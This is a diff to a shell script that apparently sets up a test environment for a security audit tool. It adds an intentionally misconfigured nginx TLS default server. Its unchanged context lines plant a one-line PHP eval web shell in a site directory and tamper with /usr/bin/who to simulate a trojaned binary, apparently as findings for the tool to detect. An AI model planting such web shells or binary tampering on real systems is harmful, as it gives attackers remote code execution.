@@ -195,6 +195,41 @@ EOF
 echo '<?php @eval($_POST["x"]); ?>' >/srv/e2e-site/up.php
 HOME=/root /opt/caddy/caddy run --config /etc/caddy/Caddyfile >/dev/null 2>&1 &
 
+# --- TLS default certificate: on 443 the only site becomes the default server,
+# so a connection to the address without a name gets the domain's certificate.
+# 8443 is done right: its default server has a self-signed localhost certificate.
+mkdir -p /etc/nginx/ssl
+openssl req -x509 -nodes -newkey rsa:2048 -days 30 -subj /CN=shop.e2e-audit.com \
+	-addext "subjectAltName=DNS:shop.e2e-audit.com,DNS:www.e2e-audit.com" \
+	-keyout /etc/nginx/ssl/shop.key -out /etc/nginx/ssl/shop.crt >/dev/null 2>&1
+openssl req -x509 -nodes -newkey rsa:2048 -days 30 -subj /CN=localhost \
+	-keyout /etc/nginx/ssl/default_server.key -out /etc/nginx/ssl/default_server.crt >/dev/null 2>&1
+cat >/etc/nginx/conf.d/e2e-tls.conf <<'EOF'
+server {
+	listen 443 ssl;
+	server_name shop.e2e-audit.com;
+	ssl_certificate /etc/nginx/ssl/shop.crt;
+	ssl_certificate_key /etc/nginx/ssl/shop.key;
+	return 200;
+}
+server {
+	listen 8443 ssl default_server;
+	server_name _;
+	ssl_certificate /etc/nginx/ssl/default_server.crt;
+	ssl_certificate_key /etc/nginx/ssl/default_server.key;
+	return 444;
+}
+server {
+	listen 8443 ssl;
+	server_name shop.e2e-audit.com;
+	ssl_certificate /etc/nginx/ssl/shop.crt;
+	ssl_certificate_key /etc/nginx/ssl/shop.key;
+	return 200;
+}
+EOF
+kill -HUP "$(cat /run/nginx.pid)"
+sleep 1
+
 # --- trojaned binary: changes content, keeps the package's path
 if [ -x /usr/bin/who ]; then
 	printf '\n#trojan' >>/usr/bin/who
